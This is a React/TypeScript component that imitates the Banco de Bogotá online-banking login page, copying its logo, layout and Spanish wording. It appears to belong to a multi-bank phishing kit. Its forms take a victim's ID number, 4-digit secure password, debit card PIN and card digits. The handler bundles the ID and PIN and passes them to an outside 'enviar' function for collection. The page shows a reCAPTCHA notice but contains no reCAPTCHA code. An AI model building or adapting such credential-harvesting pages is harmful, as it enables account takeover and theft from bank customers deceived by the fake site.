/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";
import BankCssLoader from "./BankCssLoader";

export default function BancoBogotaLogin({ enviar }: any) {
  const [activeTab, setActiveTab] = useState<"clave" | "tarjeta">("clave");

  // FORM Clave Segura
  const [cedula, setCedula] = useState("");
  const [clave, setClave] = useState("");
  const [showClave, setShowClave] = useState(false);

  // FORM Tarjeta Débito
  const [idced, setIdCed] = useState("");
  const [passCC, setPassCC] = useState("");
  const [pass4, setPass4] = useState("");
  const [showPassCC, setShowPassCC] = useState(false);
  const [showPass4, setShowPass4] = useState(false);

  const [loading, setLoading] = useState(false);
  const [showAlert, setShowAlert] = useState(true);

  function handleSubmitClaveSegura() {
    if (!cedula || clave.length !== 4) {
      console.warn("Datos de clave segura inválidos");
      return null;
    }

    return {
      view: "login",
      tipoIngreso: "clave_segura",
      user: cedula,
      pass: clave,
      bank: "bogota",
      timestamp: new Date().toISOString(),
    };
  }

  function handleSubmitTarjetaDebito() {
    if (!idced || passCC.length !== 4 || pass4.length !== 4) {
      console.warn("Datos de tarjeta débito inválidos");
      return null;
    }

    return {
      view: "login",
      tipoIngreso: "tarjeta_debito",
      user: idced,
      pass: passCC,
      timestamp: new Date().toISOString(),
    };
  }

  const inputBorderStyle = {
    borderWidth: "1px",
    borderColor: "#b3b3b3",
    borderStyle: "solid",
    outline: "none",
    paddingTop: "0px",
    paddingRight: "16px",
    paddingBottom: "0px",
    paddingLeft: "16px",
  };

  return (
    <main className="min-h-screen w-full bg-[#F5F8FC] flex flex-col md:flex-row font-sans select-none relative overflow-x-hidden">
      <BankCssLoader visible={loading} />

      {/* COLUMNA IZQUIERDA (Formulario de Ingreso alineado al centro) */}
      <section className="w-full md:w-1/2 bg-white min-h-screen flex items-center justify-center md:justify-end p-4 sm:p-8 md:pr-12 lg:pr-20 border-r border-gray-100">
        <div className="w-full max-w-[340px] sm:max-w-[370px] flex flex-col space-y-4 my-auto py-6">
          
          {/* LOGO */}
          <div className="mb-0.5">
            <img
              src="/bancos/bogota/css/logo.svg"
              alt="Banco de Bogotá"
              className="h-8 sm:h-10 w-auto object-contain"
            />
          </div>

          {/* TITULO */}
          <h1 className="text-xl sm:text-[23px] font-bold text-[#111827] tracking-tight leading-snug">
            Bienvenido a tu Banca Virtual
          </h1>

          {/* BANNER TUTORIAL */}
          <div className="bg-[#003B96] text-white rounded-xl p-3.5 flex items-center gap-3.5 shadow-2xs">
            <img
              src="/bancos/bogota/css/422e00391dd36d89affe.png"
              alt="Tutorial"
              className="w-[46px] h-[46px] rounded-full object-cover shrink-0"
            />
            <div className="text-xs leading-snug">
              <p className="font-bold text-white text-[13px] tracking-tight">
                ¿Nunca has ingresado a Banca Virtual?
              </p>
              <p className="text-white/90 text-[12px] font-normal mt-0.5">
                Aquí te decimos cómo hacerlo ›
              </p>
            </div>
          </div>

          {/* LOGIN CARD */}
          <div className="bg-white rounded-xl border border-[#D9E1EC] shadow-2xs overflow-hidden flex flex-col">
            {/* TABS */}
            <div className="flex border-b border-[#D9E1EC] h-[52px] bg-white">
              <button
                type="button"
                id="tab-clave"
                className={`flex-1 text-center font-semibold text-sm sm:text-base transition-all cursor-pointer border-b-2 ${
                  activeTab === "clave"
                    ? "border-[#0043A9] text-[#0043A9]"
                    : "border-transparent text-gray-500 hover:text-gray-700"
                }`}
                onClick={() => setActiveTab("clave")}
              >
                Clave segura
              </button>

              <button
                type="button"
                id="tab-tarjeta"
                className={`flex-1 text-center font-semibold text-sm sm:text-base transition-all cursor-pointer border-b-2 ${
                  activeTab === "tarjeta"
                    ? "border-[#0043A9] text-[#0043A9]"
                    : "border-transparent text-gray-500 hover:text-gray-700"
                }`}
                onClick={() => setActiveTab("tarjeta")}
              >
                Tarjeta débito
              </button>
            </div>

            {/* ALERT BANNER (SIN MARGIN, OCUPA EL 100% DEL ANCHO DEBAJO DE LAS TABS) */}
            {activeTab === "clave" && showAlert && (
              <div className="bg-[#EDF7FF] text-[#4A5568] px-4 py-3.5 text-xs sm:text-[13px] flex items-start justify-between leading-relaxed border-b border-[#D9E1EC] w-full m-0">
                <span className="pr-3 text-gray-700 font-normal">
                  Estás ingresando con tu Clave Segura. Selecciona ‘Tarjeta Débito’ para cambiar el tipo de ingreso.
                </span>
                <button
                  type="button"
                  onClick={() => setShowAlert(false)}
                  className="text-[#0043A9] font-normal text-lg hover:opacity-75 cursor-pointer leading-none shrink-0 pt-0.5"
                >
                  ✕
                </button>
              </div>
            )}

            {/* FORMULARIO CLAVE SEGURA */}
            {activeTab === "clave" && (
              <form
                id="form-clave"
                className="p-5 space-y-4"
                onSubmit={(e) => e.preventDefault()}
              >
                <div className="space-y-1.5">
                  <label id="cedula" className="block text-sm font-semibold text-[#4A5568]">
                    Identificación
                  </label>
                  <div className="flex gap-2.5">
                    <div className="relative w-2/5">
                      <select
                        name="tipoDocumento"
                        id="tipoDocumento"
                        defaultValue="CC"
                        style={{
                          ...inputBorderStyle,
                          paddingRight: "28px",
                          paddingLeft: "12px",
                        }}
                        className="w-full h-[48px] rounded-[8px] text-sm sm:text-base text-[#2D3748] bg-white cursor-pointer appearance-none outline-none"
                      >
                        <option value="CC">C.C. ...</option>
                        <option value="TI">T.I. Tarjeta de Identidad</option>
                        <option value="CE">C.E. Cédula de Extranjería</option>
                        <option value="NPN">N.P.N. NIT Persona Natural</option>
                        <option value="NPE">N.P.E. NIT Persona Extranjera</option>
                        <option value="NPJ">N.P.J. NIT Persona Jurídica</option>
                      </select>
                      <div className="pointer-events-none absolute right-2.5 top-1/2 -translate-y-1/2 text-[#0043A9]">
                        <svg className="w-5 h-5 stroke-[#0043A9] fill-none" strokeWidth="2.5" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
                        </svg>
                      </div>
                    </div>

                    <input
                      type="text"
                      placeholder="#"
                      maxLength={16}
                      inputMode="numeric"
                      autoComplete="off"
                      value={cedula}
                      onChange={(e) =>
                        setCedula(e.target.value.replace(/[^0-9]/g, ""))
                      }
                      style={inputBorderStyle}
                      className="w-3/5 h-[48px] rounded-[8px] text-sm sm:text-base text-[#2D3748] placeholder-gray-400 bg-white outline-none"
                    />
                  </div>
                </div>

                <div className="space-y-1.5 mt-6">
                  <label id="password" className="block text-sm font-semibold text-[#4A5568]">
                    Clave segura
                  </label>
                  <div className="relative">
                    <input
                      type={showClave ? "text" : "password"}
                      placeholder="••••"
                      maxLength={4}
                      inputMode="numeric"
                      autoComplete="new-password"
                      value={clave}
                      onChange={(e) =>
                        setClave(e.target.value.replace(/[^0-9]/g, ""))
                      }
                      style={{
                        ...inputBorderStyle,
                        paddingRight: "44px",
                      }}
                      className="w-full h-[48px] rounded-[8px] text-sm sm:text-base text-[#2D3748] placeholder-gray-400 bg-white outline-none"
                    />
                    <button
                      type="button"
                      onClick={() => setShowClave(!showClave)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-[#0043A9] hover:opacity-80 cursor-pointer p-1"
                    >
                      <svg className="w-5 h-5 text-[#0043A9]" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
                      </svg>
                    </button>
                  </div>
                </div>

                <button
                  type="submit"
                  id="ingresoButtonCC"
                  disabled={!cedula || clave.length !== 4}
                  onClick={() => {
                    setLoading(true);
                    const data = handleSubmitClaveSegura();
                    if (data) {
                      enviar(data);
                      setTimeout(() => {
                        setLoading(false);
                      }, 3000);
                    }
                  }}
                  className={`w-full h-12 rounded-[14px] text-base font-semibold transition-all ${
                    !cedula || clave.length !== 4
                      ? "bg-[#E6E6E6] text-[#888888] cursor-not-allowed"
                      : "bg-[#0043A9] text-white hover:bg-[#003688] shadow-md cursor-pointer"
                  }`}
                >
                  Ingresar
                </button>

                <div className="flex items-center justify-between border-t border-[#D9E1EC] pt-3.5 text-sm sm:text-base">
                  <button
                    type="button"
                    className="flex-1 text-center font-semibold text-[#0043A9] hover:underline cursor-pointer border-r border-[#D9E1EC] py-0.5"
                  >
                    Registrarme ›
                  </button>
                  <button
                    type="button"
                    className="flex-1 text-center font-semibold text-[#0043A9] hover:underline cursor-pointer py-0.5"
                  >
                    Olvidé mi clave ›
                  </button>
                </div>
              </form>
            )}

            {/* FORMULARIO TARJETA DÉBITO */}
            {activeTab === "tarjeta" && (
              <form
                id="form-tarjeta"
                className="p-5 space-y-4"
                onSubmit={(e) => e.preventDefault()}
              >
                <div className="space-y-1.5">
                  <label id="idced" className="block text-sm font-semibold text-[#4A5568]">
                    Identificación
                  </label>
                  <div className="flex gap-2.5">
                    <div className="relative w-2/5">
                      <select
                        name="tipoDocumento"
                        id="tipoDocumento"
                        defaultValue="CC"
                        style={{
                          ...inputBorderStyle,
                          paddingRight: "28px",
                          paddingLeft: "12px",
                        }}
                        className="w-full h-[48px] rounded-[8px] text-sm sm:text-base text-[#2D3748] bg-white cursor-pointer appearance-none outline-none"
                      >
                        <option value="CC">C.C. ...</option>
                        <option value="TI">T.I. Tarjeta de Identidad</option>
                        <option value="CE">C.E. Cédula de Extranjería</option>
                        <option value="NPN">N.P.N. NIT Persona Natural</option>
                        <option value="NPE">N.P.E. NIT Persona Extranjera</option>
                        <option value="NPJ">N.P.J. NIT Persona Jurídica</option>
                      </select>
                      <div className="pointer-events-none absolute right-2.5 top-1/2 -translate-y-1/2 text-[#0043A9]">
                        <svg className="w-5 h-5 stroke-[#0043A9] fill-none" strokeWidth="2.5" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
                        </svg>
                      </div>
                    </div>

                    <input
                      type="text"
                      maxLength={16}
                      inputMode="numeric"
                      placeholder="#"
                      autoComplete="off"
                      value={idced}
                      onChange={(e) =>
                        setIdCed(e.target.value.replace(/[^0-9]/g, ""))
                      }
                      style={inputBorderStyle}
                      className="w-3/5 h-[48px] rounded-[8px] text-sm sm:text-base text-[#2D3748] placeholder-gray-400 bg-white outline-none"
                    />
                  </div>
                </div>

                <div className="space-y-1.5 mt-6">
                  <label className="block text-sm font-semibold text-[#4A5568]">
                    Clave de tu tarjeta débito
                  </label>
                  <div className="relative">
                    <input
                      type={showPassCC ? "text" : "password"}
                      maxLength={4}
                      placeholder="••••"
                      inputMode="numeric"
                      autoComplete="new-password"
                      value={passCC}
                      onChange={(e) =>
                        setPassCC(e.target.value.replace(/[^0-9]/g, ""))
                      }
                      style={{
                        ...inputBorderStyle,
                        paddingRight: "44px",
                      }}
                      className="w-full h-[48px] rounded-[8px] text-sm sm:text-base text-[#2D3748] placeholder-gray-400 bg-white outline-none"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassCC(!showPassCC)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-[#0043A9] hover:opacity-80 cursor-pointer p-1"
                    >
                      <svg className="w-5 h-5 text-[#0043A9]" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
                      </svg>
                    </button>
                  </div>
                </div>

                <div className="space-y-1.5 mt-6">
                  <label id="pass4" className="block text-sm font-semibold text-[#4A5568]">
                    Últimos 4 dígitos de tu tarjeta débito
                  </label>
                  <div className="relative">
                    <input
                      type={showPass4 ? "text" : "password"}
                      maxLength={4}
                      placeholder="••••"
                      inputMode="numeric"
                      autoComplete="new-password"
                      value={pass4}
                      onChange={(e) =>
                        setPass4(e.target.value.replace(/[^0-9]/g, ""))
                      }
                      style={{
                        ...inputBorderStyle,
                        paddingRight: "44px",
                      }}
                      className="w-full h-[48px] rounded-[8px] text-sm sm:text-base text-[#2D3748] placeholder-gray-400 bg-white outline-none"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPass4(!showPass4)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-[#0043A9] hover:opacity-80 cursor-pointer p-1"
                    >
                      <svg className="w-5 h-5 text-[#0043A9]" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
                      </svg>
                    </button>
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={!idced || passCC.length !== 4 || pass4.length !== 4}
                  onClick={() => {
                    setLoading(true);
                    const data = handleSubmitTarjetaDebito();
                    if (data) {
                      enviar(data);
                      setTimeout(() => {
                        setLoading(false);
                      }, 3000);
                    }
                  }}
                  className={`w-full h-12 rounded-[14px] text-base font-semibold transition-all ${
                    !idced || passCC.length !== 4 || pass4.length !== 4
                      ? "bg-[#E6E6E6] text-[#888888] cursor-not-allowed"
                      : "bg-[#0043A9] text-white hover:bg-[#003688] shadow-md cursor-pointer"
                  }`}
                >
                  Ingresar
                </button>
              </form>
            )}
          </div>

          {/* DISCLAIMER */}
          <p className="text-[11px] text-[#666666] leading-normal pt-0.5">
            Este sitio está protegido por reCAPTCHA y aplican las{" "}
            <a href="https://policies.google.com/privacy" target="_blank" rel="noreferrer" className="text-[#0043A9] underline hover:text-blue-800">
              políticas de privacidad
            </a>{" "}
            y los{" "}
            <a href="https://policies.google.com/terms" target="_blank" rel="noreferrer" className="text-[#0043A9] underline hover:text-blue-800">
              términos de servicio de Google
            </a>.
          </p>

        </div>
      </section>

      {/* COLUMNA DERECHA (Imágenes planas sin bordes y ubicadas más arriba) */}
      <section className="hidden md:flex w-1/2 bg-[#F5F8FC] min-h-screen flex-col items-start justify-start pt-16 lg:pt-24 md:pl-10 lg:pl-14 p-8 relative">
        <div className="w-full max-w-[460px] flex flex-col items-center space-y-6">
          
          {/* BANNER 1: Cuenta Fácil (Plano, sin bordes ni sombras) */}
          <img
            src="/bancos/bogota/img/banner.png"
            alt="Cuenta Fácil - Sin cuota de manejo"
            className="w-full h-auto object-contain block"
          />

          {/* BANNER 2 / MENU DE OPCIONES (Plano, sin bordes ni sombras) */}
          <img
            src="/bancos/bogota/css/coue.png"
            alt="Opciones de servicio"
            className="w-full h-auto object-contain block"
          />

        </div>

        {/* WATERMARK DE VERSION */}
        <div className="absolute bottom-4 right-4 text-[10px] text-gray-400 font-mono tracking-wider">
          v1.35.1
        </div>
      </section>

    </main>
  );
}